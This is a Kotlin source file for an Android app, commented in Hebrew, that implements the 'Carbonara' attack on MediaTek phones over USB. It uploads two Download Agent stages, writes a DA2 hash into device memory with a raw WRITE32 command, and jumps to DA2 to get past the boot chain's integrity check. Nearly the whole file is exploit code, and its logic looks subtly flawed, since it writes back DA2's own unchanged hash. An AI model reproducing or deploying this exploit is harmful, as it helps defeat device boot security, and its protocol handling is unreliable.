package com.example.mtkusbtool

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.MessageDigest
import java.util.Locale

object MtkBromConnection {

    data class DaParts(
        val da1: ByteArray,
        val da1Offset: Int,
        val da1Size: Int,
        val da1Address: Long,
        val da2: ByteArray,
        val da2Offset: Int,
        val da2Size: Int,
        val da2Address: Long
    )

    // פירוק ה-DA לפי מבנה סטנדרטי של MediaTek
    private fun parseDa(data: ByteArray, onProgress: (String) -> Unit): DaParts? {
        if (data.size < 0x6C) {
            onProgress("!! DA קטן מדי (${data.size} בייט)")
            return null
        }

        // חיפוש ה-magic 0x58881688 בכל הקובץ
        var magicOffset = -1
        for (i in 0..data.size - 4) {
            val magic = ByteBuffer.wrap(data, i, 4).order(ByteOrder.LITTLE_ENDIAN).int
            if (magic == 0x58881688.toInt()) {
                magicOffset = i
                break
            }
        }
        if (magicOffset == -1) {
            onProgress("!! לא נמצא magic 0x58881688")
            return null
        }
        onProgress("נמצא magic ב-offset 0x${Integer.toHexString(magicOffset)}")

        // קריאת השדות אחרי ה-magic
        val buf = ByteBuffer.wrap(data, magicOffset, 0x68).order(ByteOrder.LITTLE_ENDIAN)
        buf.position(4) // אחרי ה-magic
        val da1Offset = buf.int
        val da1Size = buf.int
        val da1Address = buf.int.toLong() and 0xFFFFFFFFL
        val da2Offset = buf.int
        val da2Size = buf.int
        val da2Address = buf.int.toLong() and 0xFFFFFFFFL

        onProgress("DA1: offset=0x${Integer.toHexString(da1Offset)}, size=${da1Size}, addr=0x${java.lang.Long.toHexString(da1Address)}")
        onProgress("DA2: offset=0x${Integer.toHexString(da2Offset)}, size=${da2Size}, addr=0x${java.lang.Long.toHexString(da2Address)}")

        if (da1Size <= 0 || da2Size <= 0 || da1Offset + da1Size > data.size || da2Offset + da2Size > data.size) {
            onProgress("!! גדלים לא תקינים (da1=$da1Size, da2=$da2Size, total=${data.size})")
            return null
        }

        val da1 = data.copyOfRange(da1Offset, da1Offset + da1Size)
        val da2 = data.copyOfRange(da2Offset, da2Offset + da2Size)

        return DaParts(da1, da1Offset, da1Size, da1Address, da2, da2Offset, da2Size, da2Address)
    }

    // חיפוש ה-hash של DA2 בתוך DA1
    private fun findHashInDa1(da1: ByteArray, da2: ByteArray, onProgress: (String) -> Unit): Triple<Int, Int, ByteArray>? {
        val hashAlgos = listOf("MD5", "SHA-1", "SHA-256")
        for ((mode, algo) in hashAlgos.withIndex()) {
            val hash = MessageDigest.getInstance(algo).digest(da2)
            onProgress("מחשב $algo: ${hash.joinToString("") { String.format(Locale.US, "%02x", it) }}")
            
            // חיפוש ה-hash בתוך DA1
            outer@ for (i in 0..da1.size - hash.size) {
                for (j in hash.indices) {
                    if (da1[i + j] != hash[j]) continue@outer
                }
                onProgress("נמצא $algo hash ב-offset 0x${Integer.toHexString(i)}")
                return Triple(i, mode, hash)
            }
        }
        return null
    }

    // שליחת פקודת 0xD4 (WRITE32) עם כתובת ונתונים
    private fun write32(connection: android.hardware.usb.UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, addr: Long, data: ByteArray): Boolean {
        // 0xD4 = WRITE32
        if (connection.bulkTransfer(epOut, byteArrayOf(0xD4.toByte()), 1, 2000) < 0) return false
        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(addr.toInt()).array()
        if (connection.bulkTransfer(epOut, addrBytes, 4, 2000) < 0) return false
        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(data.size / 4).array()
        if (connection.bulkTransfer(epOut, sizeBytes, 4, 2000) < 0) return false
        
        // ACK
        val ack = ByteArray(1)
        connection.bulkTransfer(epIn, ack, 1, 2000)
        
        // שליחת הנתונים ב-chunks של 4 בייטים
        var offset = 0
        while (offset < data.size) {
            val chunk = if (offset + 4 <= data.size) data.copyOfRange(offset, offset + 4) else byteArrayOf(0, 0, 0, 0)
            if (connection.bulkTransfer(epOut, chunk, 4, 2000) < 0) return false
            offset += 4
        }
        return true
    }

    // שליחת פקודת 0xD5 (JUMP_DA) עם כתובת
    private fun jumpTo(connection: android.hardware.usb.UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, addr: Long): Boolean {
        if (connection.bulkTransfer(epOut, byteArrayOf(0xD5.toByte()), 1, 2000) < 0) return false
        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(addr.toInt()).array()
        if (connection.bulkTransfer(epOut, addrBytes, 4, 2000) < 0) return false
        val ack = ByteArray(2)
        connection.bulkTransfer(epIn, ack, 2, 2000)
        return true
    }

    // שליחת DA מלא (0xD7 + size + data)
    private fun sendDaFile(connection: android.hardware.usb.UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, daBytes: ByteArray, label: String, onProgress: (String) -> Unit): String? {
        onProgress("$label: שולח 0xD7 (${daBytes.size} בייט)...")
        if (connection.bulkTransfer(epOut, byteArrayOf(0xD7.toByte()), 1, 2000) < 0) return "FAIL:0xD7 write"
        
        val ack1 = ByteArray(1)
        connection.bulkTransfer(epIn, ack1, 1, 2000)
        if (ack1[0] != 0xD8.toByte()) {
            return "FAIL:0xD7 ack=${String.format(Locale.US, "0x%02X", ack1[0])}"
        }

        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(daBytes.size).array()
        if (connection.bulkTransfer(epOut, sizeBytes, 4, 2000) < 0) return "FAIL:size write"
        
        val ack2 = ByteArray(1)
        connection.bulkTransfer(epIn, ack2, 1, 2000)
        if (ack2[0] != 0xD9.toByte()) {
            return "FAIL:size ack=${String.format(Locale.US, "0x%02X", ack2[0])}"
        }

        var offset = 0
        val chunkSize = 4096
        while (offset < daBytes.size) {
            val length = minOf(chunkSize, daBytes.size - offset)
            val chunk = daBytes.copyOfRange(offset, offset + length)
            if (connection.bulkTransfer(epOut, chunk, length, 2000) < 0) return "FAIL:data write at $offset"
            
            val ack = ByteArray(1)
            connection.bulkTransfer(epIn, ack, 1, 2000)
            if (ack[0] != 0x5A.toByte() && ack[0] != 0x5F.toByte()) {
                return "FAIL:data ack at $offset = ${String.format(Locale.US, "0x%02X", ack[0])}"
            }
            offset += length
            if (offset % (chunkSize * 10) == 0) onProgress("$label: ${(offset * 100) / daBytes.size}%")
        }
        return null
    }

    fun runCarbonara(
        usbManager: UsbManager,
        device: UsbDevice,
        daBytes: ByteArray,
        onProgress: (String) -> Unit
    ): String {
        val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."

        var epIn: UsbEndpoint? = null
        var epOut: UsbEndpoint? = null
        for (i in 0 until device.interfaceCount) {
            val usbInterface = device.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                    }
                }
                if (epIn != null && epOut != null) break
            }
        }

        if (epIn == null || epOut == null) { connection.close(); return "שגיאה: לא נמצאו נקודות קצה." }

        // 1. פירוק ה-DA
        onProgress("=== שלב 1: פירוק ה-DA ===")
        val parts = parseDa(daBytes, onProgress)
        if (parts == null) {
            connection.close()
            return "שגיאה: פירוק ה-DA נכשל."
        }

        // 2. מציאת ה-hash
        onProgress("=== שלב 2: מציאת hash של DA2 בתוך DA1 ===")
        val hashInfo = findHashInDa1(parts.da1, parts.da2, onProgress)
        if (hashInfo == null) {
            connection.close()
            return "שגיאה: לא נמצא hash של DA2 בתוך DA1."
        }
        val (hashOffsetInDa1, hashMode, da2Hash) = hashInfo

        // 3. שליחת DA1
        onProgress("=== שלב 3: שליחת DA1 ===")
        val err1 = sendDaFile(connection, epOut, epIn, parts.da1, "DA1", onProgress)
        if (err1 != null) {
            connection.close()
            return "כשל ב-DA1: $err1"
        }

        // 4. שליחת DA2
        onProgress("=== שלב 4: שליחת DA2 ===")
        val err2 = sendDaFile(connection, epOut, epIn, parts.da2, "DA2", onProgress)
        if (err2 != null) {
            connection.close()
            return "כשל ב-DA2: $err2"
        }

        // 5. שליחת ה-hash לכתובת ב-DA1 שמחזיקה אותו
        onProgress("=== שלב 5: שליחת hash לזיכרון ===")
        val hashMemAddr = parts.da1Address + hashOffsetInDa1
        onProgress("כתובת hash: 0x${java.lang.Long.toHexString(hashMemAddr)}")
        if (!write32(connection, epOut, epIn, hashMemAddr, da2Hash)) {
            connection.close()
            return "כשל בשליחת hash לזיכרון."
        }

        // 6. הרצת DA2
        onProgress("=== שלב 6: הרצת DA2 ===")
        if (!jumpTo(connection, epOut, epIn, parts.da2Address)) {
            connection.close()
            return "כשל בהרצת DA2."
        }

        connection.close()
        return "הצלחה! Carbonara הורצה – DA2 אמור לרוץ עכשיו."
    }
}
